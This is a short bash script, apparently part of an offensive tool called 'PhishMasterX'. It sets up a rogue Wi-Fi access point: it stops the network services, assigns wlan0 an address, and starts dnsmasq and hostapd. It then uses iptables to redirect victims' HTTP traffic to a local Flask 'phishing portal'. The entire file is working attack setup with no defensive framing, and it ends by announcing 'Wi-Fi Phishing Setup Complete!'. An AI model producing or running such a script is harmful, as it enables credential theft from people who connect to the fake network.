#!/bin/bash

# Stop conflicting services
echo "[*] Stopping NetworkManager and wpa_supplicant..."
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# Set IP address for wlan0
echo "[*] Setting IP address for wlan0..."
sudo ip addr add 192.168.1.1/24 dev wlan0
sudo ip link set wlan0 up

# Start dnsmasq
echo "[*] Starting dnsmasq..."
sudo dnsmasq -C "$(dirname "$0")/dnsmasq.conf"

# Start hostapd
echo "[*] Starting hostapd..."
sudo hostapd "$(dirname "$0")/hostapd.conf" &

# Redirect HTTP traffic to local Flask server
echo "[*] Setting up iptables redirect to Flask phishing portal..."
sudo iptables -t nat -F
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80

echo "[+] Wi-Fi Phishing Setup Complete! Now start phishing portal from PhishMasterX menu."
